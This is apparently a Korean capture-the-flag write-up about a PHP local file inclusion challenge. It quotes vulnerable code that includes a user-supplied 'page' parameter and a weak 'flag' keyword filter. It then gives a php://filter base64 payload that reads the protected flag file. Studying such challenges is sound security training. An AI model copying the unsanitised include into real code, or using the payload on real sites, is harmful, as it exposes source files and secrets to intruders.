```
    <div class="container">
      <?php
          include $_GET['page']?$_GET['page'].'.php':'main.php';
      ?>
    </div> 
```
```
<h2>View</h2>
<pre><?php
    $file = $_GET['file']?$_GET['file']:'';
    if(preg_match('/flag|:/i', $file)){
        exit('Permission denied');
    }
    echo file_get_contents($file);
?>
</pre>
```
- 위의 두 코드에서 볼 수 있듯이 LFI 취약점을 가진 문제이다.
- 그런데, View.php파일 내부에선 preg_match를 통해 flag라는 문자열의 파일을 잡아낸다.
  - /?page=view&file=../uploads/flag.php 이런식으로 view파일내부의 file파라미터를 통해서 접근하면 말이다.
- 그래서 php wrapper를 통해 바로 이런식으로 필터링해서 접근하면 가능하다.
  - /?page=php://filter/convert.base64-encode/resource=/var/www/uploads/flag